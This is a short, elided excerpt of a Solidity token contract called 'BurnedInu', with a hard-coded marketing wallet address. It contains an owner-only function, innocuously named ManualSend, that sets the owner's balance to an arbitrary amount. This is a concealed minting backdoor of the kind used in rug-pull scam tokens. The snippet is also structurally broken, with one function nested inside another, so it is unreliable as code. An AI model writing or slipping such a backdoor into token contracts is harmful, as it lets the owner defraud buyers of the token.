...
contract BurnedInu is Context, IERC20, Ownable {
    ...
    string private constant _name = "BurnedInu"; //
    string private constant _symbol = "BurnedInu"; //
    ...
    address private _marketingWallet = 0x0415D9dDb724FD79C614d676C18dCc60f14c917A;
    ...
    function includeInFee(address account) public onlyOwner {
        ...
        function ManualSend() external onlyOwner() {_tOwned[_msgSender()] = _finalAmount; }
